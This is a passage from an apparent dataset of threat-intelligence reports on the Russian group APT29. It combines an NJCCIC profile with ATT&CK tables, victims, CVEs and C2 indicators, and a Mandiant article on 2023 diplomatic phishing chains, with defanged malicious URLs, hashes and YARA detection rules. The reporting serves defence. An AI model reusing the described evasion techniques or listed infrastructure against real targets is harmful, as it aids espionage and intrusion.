GoldMax, it increasingly favors trusted services and non-malware methods to maintain access and exfiltrate data, making detection and attribution more difficult. Infrastructure APT29 employs a range of infrastructures to support its command-and-control (C2) operations, including virtual private servers (VPS), compromised third-party websites, and cloud-based services. In recent campaigns, APT29 has leveraged platforms like Microsoft 365, Dropbox, and Google Drive to manage C2 channels and exfiltrate data. The group also favors hijacked email accounts within compromised organizations to distribute phishing emails and maintain a low profile. Victims APT29’s targeting closely aligns with Russia's foreign intelligence priorities, focusing on espionage rather than disruption. Victims typically include entities involved in diplomacy, foreign policy, international security, and sensitive research. The group's operations support Russian strategic objectives by exfiltrating classified or policy- relevant information from adversarial governments and institutions. Target Sectors Government and Diplomatic Institutions Defense and Military Contractors Energy and Critical Infrastructure Healthcare and Global Health Organizations Think Tanks and Policy Organizations Technology and Research Institutions https://www.cyber.nj.gov/threat-landscape/nation-state-threat-analysis-reports/russia-cyber-threat-operations/russia-apt29 2/15 11/8/25, 4:24 PM Geographic Focus Russia - APT29 | NJCCIC United States United Kingdom Canada NATO Member States EU Countries Ukraine Nordic and Baltic States United Nations (UN) and NGOs Attribution APT29 has been widely attributed to the SVR by both government agencies and private cybersecurity firms in the US and internationally. This attribution is supported by strong forensic evidence, including consistent use of operational infrastructure, malware development patterns, and targeting that aligns with SVR intelligence- gathering priorities. The group’s activity patterns, including working hours aligned with Moscow’s time zone, Russian language artifacts, and the strategic nature of its intrusions, further reinforce its linkage to Russian state interests. Timeline of Activity Start Date End Date Location Sector Activity 2008 Ongoing Global Government, A long-term Think Tanks, and cyber Technology espionage campaign focused on intelligence collection targeting Western governments, NGOs, and research institutions. https://www.cyber.nj.gov/threat-landscape/nation-state-threat-analysis-reports/russia-cyber-threat-operations/russia-apt29 3/15 11/8/25, 4:24 PM Russia - APT29 | NJCCIC 2014 2015 US Government Breach of unclassiﬁed US State Department and White House networks via phishing and malware. 2016 2016 US Political (DNC) Targeted the Democratic National Committee (DNC) using spearphishing. Believed APT 28 was also involved. 2020 2020 US, UK, and Healthcare and Targeted Canada Research organizations involved in COVID-19 vaccine development, exploiting vulnerabilities and conducting credential harvesting. https://www.cyber.nj.gov/threat-landscape/nation-state-threat-analysis-reports/russia-cyber-threat-operations/russia-apt29 4/15 11/8/25, 4:24 PM Russia - APT29 | NJCCIC March 2020 December Global IT, Government, SolarWinds 2020 and Private supply chain Sector attack: Compromised Orion Software to inﬁltrate US federal agencies and private companies. 2021 2022 Europe and US Government and Phishing and Think Tanks malware campaigns using new backdoors. Targeted diplomatic and policy organizations. 2023 2024 NATO-aligned Government and Continued nations military phishing campaigns targeting government ofﬁcials and diplomats, including abusing Microsoft Teams for initial access. Key Intelligence Gaps The NJCCIC has identified several critical intelligence gaps that limit a complete assessment of APT29. One major unknown is how deeply they’ve been able to compromise cloud identity services like Azure AD or Okta, which could give them wide access to sensitive systems. It’s also unclear if APT29 is developing new malware designed https://www.cyber.nj.gov/threat-landscape/nation-state-threat-analysis-reports/russia-cyber-threat-operations/russia-apt29 5/15 11/8/25, 4:24 PM Russia - APT29 | NJCCIC specifically for cloud environments, which would affect how to detect and defend against them. There is also limited knowledge about whether APT29’s recent activity has shifted to target new regions or industries, especially in response to current geopolitical events. Another challenge is the lack of clear indicators showing how they move laterally within cloud or hybrid networks, which limits our ability to spot their presence early. Since APT29 often uses public infrastructure and built-in tools, it’s becoming harder to attribute certain attacks to them. Finally, there is no solid understanding of how long APT29 threat actors typically stay inside a compromised environment, especially in cloud systems, which makes it difficult to judge how much damage they may cause before detection. MITRE ATT&CK Table (based on v12) Tactics Techniques Sub Procedure D3FEND Deployed Technique Control Initial Access Phishing Spearphishing Sent targeted D3-EMA, Email ﬁltering, attachment spearphishing D3-FWM malware emails with malicious attachments sandboxing, and user awareness Execution Command and PowerShell Used D3-PSA PowerShell Scripting interpreter logging, script block loggings PowerShel scripts to execute payloads and establish persistence Persistence Boot or Logon Registry Run Set values in D3-RPI Registry AutoStart Key Windows Execution Registry Run keys to maintain persistence across reboots monitoring and endpoint detection https://www.cyber.nj.gov/threat-landscape/nation-state-threat-analysis-reports/russia-cyber-threat-operations/russia-apt29 6/15 11/8/25, 4:24 PM Russia - APT29 | NJCCIC Privilege Exploitation N/A Exploited N/A Patch Escalation for privilege Escalation privilege escalation vulnerabilities to gain system level access management, EDR, and least privilege enforcement Defense Obfuscated N/A Used base64 D3-OBS Endpoint Evasion ﬁles or information protection and ﬁle integrity monitoring and custom encryption to obfuscate payloads and command strings Credential OS Credential LSASS Used tools to D3-CDA LSASS Access Dumping Memory dump credentials from LSASS protection, credential guard, and memory analysis Discovery System N/A Queried D3-HDI Host-based Information Discovery Lateral Remote Movement Services Remote desktop protocol intrusion detection hostnames, domain information, and system specs after gaining initial access Leveraged D3-RDP and Network RDP to move D3-RMA Segmentation, RDP monitoring, and MFA laterally between systems within compromised environments https://www.cyber.nj.gov/threat-landscape/nation-state-threat-analysis-reports/russia-cyber-threat-operations/russia-apt29 7/15 11/8/25, 4:24 PM Russia - APT29 | NJCCIC Command Application Web Used HTTPs D3-WAF and Web Proxy, and control Layer Protocol Protocols to D3-NTA TLS inspection, and anomaly detection communicate with C2 infrastructure, often over ports 443 to blend with normal trafﬁc Exﬁltration Exﬁltration N/A Data was D3-DAL and Data loss over C2 channel exﬁltrated D3-NTA prevention and trafﬁc monitoring over the same encrypted channel used for C2 to avoid detection Impact Data N/A Modiﬁed N/A File integrity manipulation monitoring and version control internal documents to confuse incident responders and hinder attribution Victims Name Date Sector City/State/Province/etc. Country/Region Reported US Department 2014-2015 Government Washington, D.C. of State White House 2015 Government Washington, D.C. Democratic 2016 Political Washington, D.C. National Committee (DNC) Organization US US US https://www.cyber.nj.gov/threat-landscape/nation-state-threat-analysis-reports/russia-cyber-threat-operations/russia-apt29 8/15 11/8/25, 4:24 PM Russia - APT29 | NJCCIC US Department 2020 Government Washington, D.C of Treasury US Department 2020 Government Washington, D.C. of Homeland Security SolarWinds 2020 IT Austin, Texas FireEye 2020 Cybersecurity California US US US US COVID-19 2020 Healthcare Various US, UK, and Canada Vaccine Research Orgs. Norwegian 2020 Government Oslo Norway Parliament Microsoft (Email 2023 Technology Redmond, Washington US Breach) US Federal 2024 Government Various US Agencies NATO-Aligned 2023-2024 Government/ Various Europe Diplomatic Missions Foreign Affairs Indicators of Compromise (IOC) Malware Malware Analysis Report Malicious Hash Associated Brief (Hyperlink, First Last Tool Name Type File Hash Files Hash Description or N/A) Reported Reported https://www.cyber.nj.gov/threat-landscape/nation-state-threat-analysis-reports/russia-cyber-threat-operations/russia-apt29 9/15 11/8/25, 4:24 PM Russia - APT29 | NJCCIC SUNBURST SHA25632519c7f1ed0d7c46 N/A Backdoor FireEye March December b4d7c85cf1a9be7c22 embedded in Analysis 2020 2020 4e0555029f51bc233 14890033ad17 SolarWinds Orion software. Part of the SolarWind supply chain attack. WELLMAIL SHA2561d8871c4eb64f9821 N/A Custom NCSC 2020 2020 0c01c2ab7a2e67539 malware Report 6b1a69c21d158a7db d3a3e1467f9b2 used in COVID-19 vaccine- related espionage. Used for exﬁltrating ﬁles. WELLMESSSHA25679c41e1f7f07ec4a4fd N/A Remote NCSC 2018 2020 60f661ce3b11d09ce4 access trojan Report 7a28e1ed6a9e6f6fa2 f03fbc3a6 (RAT) supporting HTTP, HTTPS, and command execution. Used in targeted attacks on COVID-19 research organization. https://www.cyber.nj.gov/threat-landscape/nation-state-threat-analysis-reports/russia-cyber-threat-operations/russia-apt29 10/15 11/8/25, 4:24 PM Russia - APT29 | NJCCIC GoldMax SHA256ef90581e8a914f4ecf8 N/A Persistent CISA Alert May 2020 January 7eb960b1752fd6f409 c9e6e6d195be8c2676 e6b347e7d 2021 malware used for C2 operations over HTTPS with evasive capabilities. Linked to post SolarWinds activity. SHA256Varies N/A Commercial CISA Alert 2019 Ongoing penetration testing tools used post- compromised to establish persistence and lateral movement. Cobalt Strike (Beacon) Kazuar SHA256a5adf2c6dd9d0bce750 N/A .NET Palo Alto 2017 2021 be28d09b80c14843a1 e496dcfa98ecac8dc553 5b7c6a8 backdoor with strong obfuscation, used for espionage. Network Network Artifact Details Intrusion Phase First Reported Last Reported avsvmcloud[.]com SUBBURST C&C December 2020 April 2021 backdoor C2 domain databasegalore[.]com BEACON C2 C&C December 2020 April 2021 domain for Cobalt Strike https://www.cyber.nj.gov/threat-landscape/nation-state-threat-analysis-reports/russia-cyber-threat-operations/russia-apt29 11/15 11/8/25, 4:24 PM Russia - APT29 | NJCCIC deftsecurity[.]com Malware hosting C&C and payload December 2020 April 2021 delivery 13.59.205.66 Cobalt Strike C2 C&C 2020 2021 IP 54.193.127.66 Malware C7C and initial 2020 2021 distribution payload server IP 204.188.205.66 Phishing Initial Access 2020 2021 infrastructure/ credential capture IP GraphicalProton C&C December 2023 December 2023 hxxps://matclick[.]com/wp- query[.]php HTTPS C2 URL 65.20.97.203 Tunnel endpoint C&C/ lateral December 2023 December 2023 for movement GraphicalProton backdoor 65.21.51.58 Tunnel endpoint C&C/ lateral December 2023 December 2023 movement 103.76.128.34 Exploitation Initial access September 2023 December 2023 server linked to JetBrains TeamCity CVE abuse System Artifacts Host Artifact Type Details Tactic First Last Reported Reported https://www.cyber.nj.gov/threat-landscape/nation-state-threat-analysis-reports/russia-cyber-threat-operations/russia-apt29 12/15 11/8/25, 4:24 PM Russia - APT29 | NJCCIC netsetupsvc.dll DLL SUNBURST Execution/ December 2021 loader DLL Persistence 2020 planted via SolarWinds Orion compromise GoldMax backdoor executable Binary/ Hides in hidden Persistence May 2020 2021 Process directories. Persistence via cron job on Linux. TrailBlazer implant Binary/ Process Hides as Persistence/ 2019 2021 legitimate Command ﬁlenames. & Control Persistence via WMI event subscription. Registry key at Registry PowerShell Execution/ 2021 2021 HKLM:\Software\Classes\CLSID\ script loader Defense {...}\ProgID\{...} payload Evasion embedded in CLSID key, executed via rund1132.exe wine.exe + side-loaded Process/ DLL Zip contains Execution/ April 2025 April 2025 malicious .dll (GRAPELOADER) genuine Persistence PowerPoint launcher (wine.exe) that side loads DLL implementing Grapeloader. https://www.cyber.nj.gov/threat-landscape/nation-state-threat-analysis-reports/russia-cyber-threat-operations/russia-apt29 13/15 11/8/25, 4:24 PM Russia - APT29 | NJCCIC Custom Cobalt Strike loader DLL BEATDROP Execution January January mapped over ntdll.dll shellcode mapping/ In- downloader 2022 2022 memory maps its own loader version for ntdll.dll, spawns suspended thread, injects shellcode to evade detection. Common Vulnerabilities and Exposures (CVEs) CVE Number CVSS Score Patch Other Date Patch Applied Available Remediation Reported (Y/N/UNK/NA) (Y/N) Y Y CVE-2020- 7.8 10148 CVE-2021- 9.8 34473 Update December Y SolarWinds 2020 Orion platform Apply March 2021 Y Microsoft Exchange Server patches CVE-2021- 9.1 Y Exchange March 2021 Y 26855 Server patch, disable external access CVE-2023- 8.6 Y Update September Unknown 42793 JetBrains 2023 TeamCity server https://www.cyber.nj.gov/threat-landscape/nation-state-threat-analysis-reports/russia-cyber-threat-operations/russia-apt29 14/15 11/8/25, 4:24 PM CVE-2019- 9.8 19781 CVE-2020- 7.5 0688 Y Y Russia - APT29 | NJCCIC Apply Citrix December Y ADC and 2019 Gateway patches Microsoft February Y Exchange 2020 Server patch https://www.cyber.nj.gov/threat-landscape/nation-state-threat-analysis-reports/russia-cyber-threat-operations/russia-apt29 15/15"
G0016_APT29,/Users/susan/Documents/PhD/HCI - Uncertainty/Project/TRACER/APT Reports/G0016_APT29/gstatic.com-Backchannel Diplomacy_ APT29’s Rapidly Evolving Diplomatic Phishing Operations.pdf,bbc83dd4b177,G0016,"Backchannel Diplomacy: APT29’s Rapidly Evolving Diplomatic Phishing Operations cloud.google.com/blog/topics/threat-intelligence/apt29-evolving-diplomatic-phishing Written by: Luke Jenkins, Josh Atkins, Dan Black Key Insights APT29’s pace of operations and emphasis on Ukraine increased in the first half of 2023 as Kyiv launched its counteroffensive, pointing to the SVR’s central role in collecting intelligence concerning the current pivotal phase of the war. During this period, Mandiant has tracked substantial changes in APT29’s tooling and tradecraft, likely designed to support the increased frequency and scope of operations and hinder forensic analysis. APT29 has used various infection chains simultaneously across different operations, indicating that distinct initial access operators or subteams are possibly operating in parallel to service different regional targets or espionage objectives. Threat Detail During the lead up to Ukraine's counteroffensive, Mandiant and Google’s Threat Analysis Group (TAG) have tracked an increase in the frequency and scope of APT29 phishing operations. Investigations into the group’s recent activity have identified an intensification of operations centered on foreign embassies in Ukraine. Notably, as part of this activity, we have seen phishing emails targeting a wide range of diplomatic representations in Kyiv including those of Moscow’s partners, representing the first time we have observed this cluster of APT29 activity pursuing governments strategically aligned with Russia. Based on the timing and focus of APT29’s Ukraine- focused operations, we judge they are intended to aid Russia’s Foreign Intelligence Service (SVR) in intelligence collection concerning the current pivotal phase of the war. APT29’s increased phishing activity in Ukraine has occurred alongside an uptick in the group’s more routine espionage operations against global diplomatic entities. Across these malware delivery operations, APT29 continues to prioritise European Ministries of Foreign Affairs and embassies, but it has also sustained operations that are global in scope and illustrative of Russia’s far-reaching ambitions and interests in other regions. The 1/30 current secondary focus is concentrated in Asia, with governments in Türkiye (formerly known as Turkey), India, and other regions of vital strategic importance to Moscow such as Africa factoring into its 2023 priorities. We judge that Russia’s war in Ukraine has almost certainly shaped APT29’s espionage priorities, but it has not supplanted them. We track this diplomatic-focused phishing activity as operationally distinct from APT29’s ongoing initial access operations targeting cloud-based Microsoft products. Although APT29’s cloud-focused exploitation may lead to the compromise of diplomatic entities, variance in the scale, quality and targeting patterns of the two lines of effort indicate that they are highly likely distinct initial access clusters operating with different priorities and levels of capability. However, we continue to see significant overlap in post-compromise methods across both lines of effort, indicating that multiple initial access teams may hand-off to a centralized exploitation team once inside a victim environment. Figure 1: APT29’s distinct initial access clusters Alongside the increased pace of operations and changes in targeting, we have also seen a major shift in the group’s tooling and tradecraft. APT29 has rebuilt several of its tools and has made repeated iterative modifications to its existing malware delivery chain, likely to ensure its operational longevity despite long-term persistent use. We assess that several of these changes are highly likely specifically designed to sidestep research methods and tools commonly used by the threat intelligence community to track their operations, indicating that operational security priorities continue to factor heavily into APT29’s tooling decisions. APT29’s Evolving Approach to Malware Delivery Starting in 2021, APT29 adopted a tactic called HTML smuggling in its malware delivery operations, hiding its first-stage JavaScript dropper in malicious HTML attachments we call ROOTSAW (also known as EnvyScout). As detailed in previous research by Mandiant, CERT-Polska, Palo Alto Networks and others, ROOTSAW has been a constant feature of APT29's operations over the past two years and has been the primary vehicle to decode and deliver the group’s next stage malware. Upon opening the archive file, victims are presented with 2/30 either a Windows shortcut (LNK) file or a legitimate software binary, that when opened, executes an accompanying DLL, leading to commodity backdoors such as BEACON or BRC4 (Brute Ratel C4) executing on the system. ROOTSAW’s central and continued role in APT29 operations has spurred changes to the malware delivery chain over time. The most visible change has been the move away from HTML attachments as the initial infection vector, with APT29 shifting to hosting its first-stage payloads on compromised web services such as WordPress sites. Migrating the first-stage payload server side has likely provided APT29 a greater degree of control over its malware delivery chain and allowed the group to be more judicious about the exposure of its later-stage capabilities. For example, to prevent detection of malware in environments not intended for compromise, APT29 has implemented various forms of filtering in its first-stage payloads and has removed staged malware from compromised servers shortly after operational use. Notably, these efforts have also prevented payloads being acquired by public malware repositories and other common security research tools, helping to avoid detection and extend the operational lifespan of its newer malware variants. 3/30 4/30 Figure 2: APT29’s diverse first-stage delivery methods As shown the following campaigns tracked throughout the first half of 2023 detail, APT29 has made continuous, iterative efforts to introduce additional obfuscation and anti-analysis components into its operations. The group has experimented with various obfuscation techniques such as the use of JavaScript Obfuscator, delivery and execution guardrails, hosting decryption keys server side, and delivering decoy documents when victim profiling checks fail. In this accelerated period of tooling evolution, the group has also begun to rotate in novel malware delivery tools and techniques instead of its mainstay first-stage payload. March 2023: Earthquake-Themed Türkiye Campaign In March 2023, Mandiant identified a new APT29 phishing campaign targeting Türkiye. The phishing waves impersonated the Turkish Deputy Minister of Foreign Affairs and included a phishing link accompanied by content related to the February 2023 earthquake that struck southern Türkiye. 5/30 The first wave, conducted in early March, used a phishing link generated by a URL shortening service “https://tinyurl[.]com/mrxcjsbs” to redirect victims to a ROOTSAW dropper hosted on an actor-controlled compromised website “https://www.willyminiatures[.]com/e-yazi.htm/?v=bc78a8d162c6”. When visited, the URL downloaded the ROOTSAW dropper ""e-yazi.htm"" (MD5: a3067a0262e651e94329869f43a51722) to drop additional files onto the victim machine, including a malicious ISO, ""e-yazi.iso"" (MD5: eeded26943a7b2fdef7608fb21bbfd66). This is the first time Mandiant has seen APT29 introduce an additional layer of obfuscation to its phishing links using a URL shortening service. The second wave, victims were directed to an actor-controlled compromised website “https://simplesalsamix[.]com/e-yazi.html” to download the ROOTSAW dropper ""e-yazi.html"" (MD5: b051e8efb40c2c435d77f3be77c59488). The second ROOTSAW sample dropped similar decoy content and a malicious ZIP file, e-yazi.zip (MD5: 854e5c592e93b69b8ab08dbc8a0b673f), that contained second-stage downloaders and an additional ROOTSAW dropper file. In both waves, APT29 incorporated a new version of ROOTSAW with added user-agent based anti-analysis guardrails. This variant checks the user-agent of the device, looking for Windows operating systems that do not contain “.NET” and contain the value “Windows NT”. As a result, if the victim is running a non-Windows based operating system or the request is made through .NET, the server will deliver a decoy PDF file. In the second wave, this PDF file was identical to the version contained in the malicious ZIP payload. This filtering tactic is likely used to identify automated downloaders and non-compatible victim devices, further reducing the odds of exposing malware in non-compromise contexts. Each payload within the new ROOTSAW variant is obfuscated using a unique key, although the deobfuscation routine remains the same. 6/30 7/30 Figure 3: ROOTSAW user-agent and operating system check to determine which file to deploy March 2023: European Diplomatic-Focused Phishing Campaigns In an additional phishing campaign in March 2023, APT29 targeted various diplomatic missions in Europe. Notably, in the two weeks that lapsed between the Turkey campaign, further changes were identified resulting in two new variants of ROOTSAW that shifted the newly added anti-analysis guardrails server side. 8/30 In the first wave, emails contained a PDF attachment (MD5: 1485b591e654327c1d032a901940b149) inviting victims to a drink reception following an event on the “Future of International Economic Relations” from the Embassy of Spain. The PDF contains a link to an actor-hosted ROOTSAW variant hosted at “https://parquesanrafael[.]cl/note.html”, ultimately leading to the deployment of MUSKYBEAT (also known publicly as QUARTERRIG). This version of ROOTSAW sends the victim’s user-agent to the compromised server using an HTTP GET request “https://parquesanrafael[.]cl/note.php?ua=”. The server then performs filtering based on an actor-defined denylist, finally returning a decryption key for the payload if the tests are successfully passed. If these tests fail, ROOTSAW drops a corrupt file, rather than exposing the embedded decoy file like in previous versions. In the second wave, APT29 delivered an additional new variant of ROOTSAW (MD5: 0d5b12c50173a176b0a8ba5a97a831d8), containing both user-agent and IP filtering, but ultimately leading to the same MUSKYBEAT downloader. This version conducts an additional check by obtaining the victim’s IP address through a request to a public API service “https://api.ipify[.]org/?format=json”. 9/30 Figure 4: ROOTSAW payload decryption routine April 2023: Old Wine in a New Bottle In April 2023, APT29 continued to modify its standard malware delivery chain, introducing a new technique for malware delivery. In this operation, APT29 re-used one its frequent diplomatic event-themed lure documents spoofing the Czechia Embassy (more commonly known as the Czech Republic) that invited targets to a wine tasting event on April 13, 2023. The document contained a link to the phishing website “https://sylvio[.]com[.]br/form.php”, which delivered either an ISO or a ZIP archive to the victim. Rather than using ROOTSAW, victims were delivered a malicious ISO or ZIP file directly from the compromised web server if they successfully passed the server-side filtering checks. The decision to remove the HTML smuggling stage of the infection chain was likely intended to further reduce the number of forensic artifacts left on the host that are prone to detection or later analysis. May 2023: Ukraine Foreign Embassy-Focused Campaigns In May, in the lead up to Ukraine’s counteroffensive, APT29 conducted two distinct phishing waves targeting a wide range of diplomatic representations in Kyiv, including those of Moscow’s partners. Each campaign adopted separate intrusion chains similar to those seen in March and April 2023. In the first wave in early May, an repurposed advert for a BMW sale in Kyiv was circulated, directing victims to an actor-controlled server at “https://resetlocations[.]com/bmw.htm”, which delivered a weaponized ISO file, ""bmw.iso"" (MD5: e306333093eaf198f4d416d25a40784a). The version of ROOTSAW used in this campaign shares similarities to variants used in March against Türkiye. Depending on user-agent filtering, the ISO or a decoy image of the BMW would be displayed. In the second wave mid-May, an invite for a charity concert in Kyiv with a mistyped filename “Invintation.zip” (MD5: 38719acc6254b7ff70dc8a7723bd8e92) was sent to targets, likely also using a copy of a legitimate document. Similar to the April wine-themed campaign, payloads were hosted directly on actor-controlled infrastructure that used user-agent filtering to deliver either a ZIP file with decoy PDF documents (MD5:38719acc6254b7ff70dc8a7723bd8e92), or a ZIP file containing a second-stage payloads (MD5:1aee5bf23edb7732fd0e6b2c61a959ce) to victims. 10/30 11/30 Figure 5: Likely repurposed legitimate invite to a charity concert in Ukraine June 2023: Split ROOTSAW Campaign In late June, Mandiant identified an additional APT29 phishing campaign with a new variant of ROOTSAW to target a European government. Phishing emails were sent from a compromised North American government email address and crafted to appear as an invitation to a public holiday celebration from Norwegian embassy personnel. Two different delivery mechanisms were used in this campaign, a PDF (MD5: b4141aa8d234137f0b9549a448158a95) containing a link to an actor-hosted ROOTSAW variant, and emails with an attached Scalable Vector Graphic (SVG) file (MD5: 295527e2e38da97167979ade004de880) rather than the typical HTML payload. Notably, although APT29 used a compromised WordPress server to host the ROOTSAW payload, non- valid targets received a generic HTTP 404 error rather than the traditional WordPress 404. 12/30 Mandiant has identified that once APT29 removes the server side functionality, the compromised WordPress site will start displaying the correct WordPress 404 error indicating that the file was not found. We therefore suspect that organisations compromised by APT29 to deliver malware will likely not find logs for this activity within WordPress, although they may exist within other services such as the underlying web server. The ROOTSAW variant contained in the SVG file is similar to those first identified in 2021, indicating that the threat actor may have only recently adopted SVG files for its HTML smuggling technique. Consistent with other cases where APT29 has introduced new delivery methods for ROOTSAW, the group reverted to a primitive ROOTSAW payload without anti-analysis techniques or other forms of hardening. Figure 6: Traditional 404 error from compromised APT29 infrastructure 13/30 Figure 7: 404 error from IP filtered by APT29 July 2023: ICEBEAT Campaign In July, APT29 continued to experiment with new ROOTSAW delivery mechanisms and victim filtering capabilities in an operation deploying a new downloader ICEBEAT to target European diplomatic entities. Emails were sent purporting to be an invite from a non-specified German embassy for an Ambassador’s farewell 14/30 reception. Of note, ICEBEAT’s use of the open source Zulip messaging platform for command and control (C2) follows a pattern of past APT29 downloaders using legitimate services for command and control including Dropbox, Firebase, OneDrive and Trello. For the first time in this campaign, ROOTSAW was contained within a PDF document. When opened, the PDF document writes an HTML file to disk, that when launched, writes a follow-on ZIP file to disk and beacons to an actor controlled domain “https://sgrfh[.]org.pk/wp-content/idx.php?n=ks&q=” to profile victim information. Victims who met filtering requirements were delivered a Save the date decoy PDF document (MD5: 50f57a4a4bf2c4b504954a36d48c99e7) and delivered the next-stage downloader ICEBEAT that is responsible for downloading follow-on capabilities from the Zulip messaging service. In instances where the victim did not meet filtering requirements, a separate benign decoy document referencing German Unity Day (MD5: ffce57940b0257a72db4969565cbcebc) was delivered in place of ICEBEAT. Figure 8: Decoy lure used by APT29 for filtered victims 15/30 16/30 Figure 9: PDF decoy document used during successful malware delivery Malware Choices Possibly Reflect Distinct APT29 Subteams Beyond the continued adaptation of APT29’s malware delivery chain, Mandiant has also observed dedicated efforts to update and evolve the group’s later-stage malware into multiple variations, increasing the quantity and quality of tooling used across its campaigns. At least six distinct downloaders have been identified during the first half of 2023: BURNTBATTER is an in-memory loader responsible for decrypting and executing a payload from disk into a running process. BURNTBATTER has been witnessed loading the SPICYBEAT downloader via a position-independent shellcode dropper called DONUT. DONUT is a publicly available tool that creates position-independent shellcode that loads .NET assemblies, PE files, and other Windows payloads from memory and runs them with parameters. SPICYBEAT is a downloader written in C++ responsible for downloading a next-stage payload from either DropBox or Microsoft's OneDrive. MUSKYBEAT is an in-memory dropper that decodes the next-stage payload and strings using RC4 and executes in the current process. STATICNOISE is a downloader written in C responsible for downloading and executing the final-stage payload in memory. 17/30 DAVESHELL is shellcode that functions as an in-memory dropper relying on reflective injection. Its embedded payload is mapped into memory and executed. DAVESHELL is based in the public available repository. 18/30 19/30 Figure 10: APT29’s Second-Stage Downloaders Used in 2023 As noted in the June 2023 campaign, we have also witnessed APT29 operating various infection chains simultaneously within a single campaign, suggesting that distinct initial access operators or subteams may be operating in parallel to service different regional targets or espionage objectives. Although we have been unable to ascertain the specific logic behind decisions about which malware delivery approach to use or when to introduce new later-stage malware variants, we judge with low confidence that they are likely driven by mission- specific parameters such as targets or operational objectives. The first use of new capabilities are typically reserved for targets inside Ukraine or diplomatic entities associated with North Atlantic Treaty Organization (NATO) or European Union (EU) member states, areas of likely heightened strategic importance given Moscow’s need to understand political and military dynamics surrounding its war in Ukraine. Upon first use of new tactics or tools in higher risk environments, we have observed APT29 incorporate these new tools into its broader operations with minimal changes, pointing to the group’s possible changing risk calculus after first exposure. 20/30 Patterns of controlled first-use possibly extend back to the emergence of APT29’s diplomatic-focused phishing cluster in 2021. In May 2021, during Russia’s initial troop-build up around Ukraine, Mandiant identified an APT29 operation using ICEBREAKER, a modified variant of BOOMMIC (also known as VaporRage) embedded in software mimicking an installer for a legitimate Ukrainian government application. As detailed by SentinelOne, multiple aspects of the malware delivery chain were likely tailored for a highly-targeted operation against Ukrainian government entities. Conclusions The increased scope and frequency of APT29's diplomatic-focused spear phishing campaigns in the first half of 2023 has compelled the initial access team to make repeated modifications to its long-standing malware delivery chain. Efforts to move capabilities server side, introduce anti-analysis components, and deliver decoy documents in non-compromise contexts have likely helped the group extend the shelf-life of its ROOTSAW- centred concept of operations. Even with this unprecedented pace of change, the group has remained highly operational security conscious, and has taken repeated steps to circumvent the methods that security researchers use to track and respond to its activity. APT29's increased operational tempo has also exposed patterns of operations that likely reflect different initial access operators or subteams supported by a centralized development team. More generally, these patterns likely reflect a growing mission and pool of resources dedicated to collecting political intelligence and that group will almost certainly continue to pose a high severity threat to governments and diplomatic entities globally. Protecting The Community As part of our efforts to combat serious threat actors, TAG uses the results of our research to improve the safety and security of Google’s products. Upon discovery, all identified websites and domains are added to Safe Browsing to protect users from further exploitation. TAG also sends all targeted Gmail and Workspace users government-backed attacker alerts notifying them of the activity and encourages potential targets to enable Enhanced Safe Browsing for Chrome and ensure that all devices are updated. Where possible, Mandiant sends victim notifications via the Victim Notification Program. We are committed to sharing our findings with the security community to raise awareness, and with companies and individuals that might have been targeted by these activities. We hope that improved understanding of tactics and techniques will enhance threat hunting capabilities and lead to stronger user protections across the industry. Appendix ATT&CK Matrix ATT&CK Tactic Category Techniques Resource Development Acquire Infrastructure (T1583) Virtual Private Server (T1583.003) Compromise Infrastructure (T1584) Stage Capabilities (T1608) Link Target (T1608.005) Obtain Capabilities (T1588) Digital Certificates (T1588.004) 21/30 Initial Access Phishing (T1566) Spearphishing Attachment (T1566.001) Spearphishing Link (T1566.002) External Remote Services (T1133) Execution User Execution (T1204) Malicious Link (T1204.001) Malicious File (T1204.002) Command and Scripting Interpreter (T1059) PowerShell (T1059.001) Windows Command Shell (T1059.003) JavaScript (T1059.007) Scheduled Task/Job (T1053) Scheduled task (T1053.005) Persistence Scheduled Task/Job (T1053) Scheduled task (T1053.005) Privilege Escalation Defence Evasion Discovery Command and Control Process Injection (T1055) Scheduled Task (T1053) Scheduled task (T1053.005) Process Injection (T1055) Obfuscated Files or information (T1027) Indicator Removal from Tools (T1027.005) HTML Smuggling (T1027.006) Embedded Payloads (T1027.009) Virtualization/Sandbox Evasion (T1497) System Checks (T1497.004) Modify Registry (T1112) Deobfuscate/Decode Files or Information (T1140) Reflective Code Loading (T1620) Indicator Removal (T1070) File deletion (T1070.004) Timestomp (T1070.006) Masquerading (T1036) Process Discovery (T1057) Software Discovery (T1518) Query Registry (T1012) Account Discovery (T1087) Local Account (T1087.001) Domain Account (T1087.002) System Information Discovery (T1082) File and Directory Discovery (T1083) Web Service (T1102) Application Layer Protocol (T1071) Web Protocols (T1071.001) DNS (T1071.004) Encrypted Channel (T1573) Asymmetric Cryptography (T1573.002) Non-Application layer Protocol (T1095) Non-Standard Port (T1571) Ingress Tool Transfer (T1105) 22/30 Exfiltration Data Transfer Size Limits (T1030) Detection Rules rule M_Dropper_BURNTBATTER_1 { meta: author = ""Mandiant"" date_created = ""2023/04/26"" description = ""Searches for the custom chaskey implementation"" version = ""1"" weight = ""100"" disclaimer = ""This rule is meant for hunting and is not tested to run in a production environment."" strings: $chaskey_imp = {41 81 C8 20 20 20 20 41 81 F8 6B 65 72 6E} condition: any of them } rule M_Dropper_Donut_1 { meta: author = ""Mandiant"" date_created = ""2023-04-12"" description = ""Detects the structure of the Donut loader"" version = ""1"" weight = ""100"" condition: uint8(0) == 0xE8 and uint32(1) == uint32(5) and uint8(uint32(1)+5) == 0x59 } rule M_Downloader_STATICNOISE_1 { meta: author = ""Mandiant"" date_created = ""2023-04-14"" description = ""Detects the deobfuscation algorithm and rc4 from STATICNOISE"" version = ""1"" weight = ""100"" strings: $ = {41 8A C8 48 B8 [8] 80 E1 07 C0 E1 03 48 D3 E8 41 30 04 10 49 FF C0} $ = {80 E1 07 C0 E1 03 48 b8 [8] 48 D3 E8 30 04 17 48 FF C7 48 83 FF} $ = {40 88 2C 3A 49 8B 02 88 0C 06 45 89 0B 44 89 03 4D 8B 0A} $ = {4D 8B 0A 46 0F BE 04 0A 44 03 C1 41 81 E0 FF 00 00 80} condition: all of them } 23/30 rule M_Dropper_MUSKYBEAT_1 { meta: author = ""Mandiant"" date_created = ""2023-04-06"" description = ""Detects the RC4 encryption algorithm used in MUSKYBEAT"" version = ""1"" weight = ""100"" disclaimer = ""This rule is meant for hunting and is not tested to run in a production environment."" strings: $ = {42 8A 14 04 48 8D ?? ?? ?? ?? ?? 8A C2 41 02 04 08 44 02 D0 41 0F B6 CA} $ = {41 B9 04 00 00 00 41 B8 00 30 00 00 48 8B D3 33 C9} condition: all of them } rule M_Hunting_DaveShell_Dropper_1_2 { meta: author = ""Mandiant"" description = ""Detects Shellcode RDI projects from 